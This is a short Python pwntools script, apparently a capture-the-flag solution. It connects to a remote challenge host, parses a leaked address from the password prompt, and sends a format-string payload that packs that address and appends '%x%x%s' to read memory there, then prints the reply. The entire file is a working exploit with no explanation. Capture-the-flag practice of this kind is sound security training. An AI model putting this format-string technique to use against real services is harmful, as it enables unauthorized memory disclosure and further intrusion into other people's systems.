from pwn import *

connect = remote("0.cloud.chals.io", 25449)

output = connect.recvuntil('password:')
addr = output.decode().split('\n')[0].split(' ')[-1]

payload = p32(int(addr, 16)) + b"%x%x%s"

res = connect.sendline(payload)

output = connect.recvline()
print('------ OUTPUT -------')
print(output)
print('------ OUTPUT -------')
